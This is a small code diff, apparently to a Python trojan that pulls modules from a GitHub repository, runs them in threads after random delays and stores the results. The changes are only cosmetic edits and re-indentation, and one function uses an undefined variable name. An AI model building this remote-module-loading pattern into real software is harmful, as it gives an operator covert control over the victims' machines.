@@ -23,6 +23,7 @@ def connect_to_github():
     return gh,repo,branch
 
 def get_file_contents(filepath):
+    # type: (object) -> object
     gh,repo,branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
     for filename in tree.tree:
@@ -51,6 +52,7 @@ def store_module_result(data):
 class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
+   
     def find_module(self, fullpath, path=None):
         if configured:
             print("[*] Attempting to retrieve %s" % fullname)
@@ -82,4 +84,4 @@ while True:
             t.start()
             time.sleep(random.randint(1,10))
 
-time.sleep(random.randint(1000,10000))
+    time.sleep(random.randint(1000, 10000))
